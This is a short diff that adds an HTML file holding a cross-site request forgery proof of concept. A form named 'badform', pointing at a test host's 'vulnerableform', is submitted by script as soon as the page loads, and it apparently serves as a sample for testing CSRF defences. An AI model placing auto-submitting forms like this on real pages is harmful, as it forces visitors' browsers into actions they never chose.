@@ -1,0 +1,5 @@
+<form name="badform" method="post" action="http://test.com/vulnerableform">
+	<input type="text" name="username" value="test">
+	<input type="checkbox" name="status" checked>
+</form>
+<script>document.badform.submit()</script>
